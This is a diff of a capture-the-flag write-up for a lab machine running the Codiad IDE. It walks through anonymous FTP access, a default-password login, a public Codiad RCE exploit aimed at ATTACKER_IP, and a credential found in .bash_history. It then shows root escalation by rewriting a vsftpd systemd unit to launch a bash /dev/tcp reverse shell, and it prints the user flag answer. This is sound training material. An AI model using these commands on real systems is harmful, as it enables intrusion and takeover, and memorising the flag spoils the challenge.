@@ -16,10 +16,9 @@ PORT      STATE SERVICE REASON         VERSION
 
 ---
 
-## Enumeration: FTP
+## FTP
 
-Going into FTP and trying anonymous, I got a file named `-`.
-I copied the file, renamed it `test`, and got this:
+Going into FTP and trying anonymous, I got a file named `-`. I copied the file, named it `test`, and got this out of it:
 
 ```
 Hey john,
@@ -28,74 +27,43 @@ Also, please take care of the image file ;)
 - drac.
 ```
 
-<img width="1859" height="968" alt="Screenshot From 2025-09-02 21-53-28" src="https://github.com/user-attachments/assets/b529fedf-6baf-4aa6-af29-0a29d03c1c61" />
+There are two people named john and drac. John’s password has been reset to default and there’s an image file. Pivoting to the web server.
 
-So there are two users (`john` and `drac`), and John’s password has been reset to the default.
-There’s also mention of an image file.
+<img width="1859" height="968" alt="Screenshot From 2025-09-02 21-53-28" src="https://github.com/user-attachments/assets/6d2b21c6-847f-41a8-8f33-c7f5b9f49908" />
 
----
-
-## Environment
-
-* **Target IP / Service**: `ide.thm:62337` (Codiad IDE running on web)
-* **Users mentioned**: john, drac
-* **Default password**: likely `password`
 
 ---
 
-## Steps
+## Web & Exploit
 
-### Step 1: Web login
+I tried the username `john` and password `password`. That worked.
 
-With my luck, I tried:
+Now I saw four different Python files and they all worked together. I found this exploit online for **Codiad 2.8.4**:
 
-```
-Username: john
-Password: password
-```
-
-It worked.
-
----
-
-### Step 2: Exploit Codiad RCE
-
-I noticed four different Python files working together and recognized the IDE as **Codiad 2.8.4**, which has a public RCE exploit.
-
-Exploit link:
 [https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit)
 
-Setting up payload:
+Setting up the payload:
 
 ```bash
 python exploit.py http://ide.thm:62337/ john password ATTACKER_IP 1234 linux
 ```
 
-Follow the GIFs in the GitHub repo if confused.
-
----
-
-### Step 3: First Flag Enumeration
-
-Once in, I tried to read the first flag but couldn’t because of permissions.
-Pivoting around, I checked `.bash_history` and found a password:
+Follow the GIFs in the GitHub if confused. After getting in, I tried to read the first flag but didn’t have permission. Pivoting around and looking at `.bash_history`, I saw a password:
 
 ```
 mysql -u drac -p 'Th3dRaCULa1sR3aL'
 ```
 
-Switching user to `drac` with that password, I got in and grabbed the first flag:
+Switching to drac with that password worked, and I got the first flag:
 
-> Q1: User flag?
+> Q1: User flag
 > A1: 02930d21a8eb009f6d26361b2d24a466
 
 ---
 
-## PrivEsc: drac → root
+## Privilege Escalation
 
-### Step 4: Sudo permissions
-
-Running `sudo -l`:
+Doing `sudo -l` as drac:
 
 ```
 Matching Defaults entries for drac on ide:
@@ -106,40 +74,18 @@ User drac may run the following commands on ide:
     (ALL : ALL) /usr/sbin/service vsftpd restart
 ```
 
-This means I can restart the vsftpd service as root.
+I checked the systemd unit file for vsftpd at `/lib/systemd/system/vsftpd.service`. Normally it contains the instructions for systemd to launch the FTP server.
 
----
-
-### Step 5: Malicious systemd unit file
-
-I checked the systemd unit file for vsftpd at:
-
-```
-/lib/systemd/system/vsftpd.service
-```
-
-Normally this file contains instructions for systemd to launch the FTP server.
-I edited it and changed the `ExecStart` line to run my payload:
+I edited the file and changed the `ExecStart` line so instead of starting `/usr/sbin/vsftpd`, it ran my payload:
 
 ```bash
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'
 ```
 
-This command tells bash to start an interactive shell and connect it over TCP to my attacker machine on port 9001, redirecting input/output so I gain control.
-
----
-
-### Step 6: Trigger payload
-
-After saving the file, I reloaded systemd:
+After saving the file, I ran:
 
 ```bash
 systemctl daemon-reload
-```
-
-Then I used my sudo privilege:
-
-```bash
 sudo /usr/sbin/service vsftpd restart
 ```
 
@@ -151,7 +97,7 @@ With a netcat listener running:
 nc -lvnp 9001
 ```
 
-I caught the reverse shell and gained root.
+I caught a reverse shell and gained root.
 
 ---
 
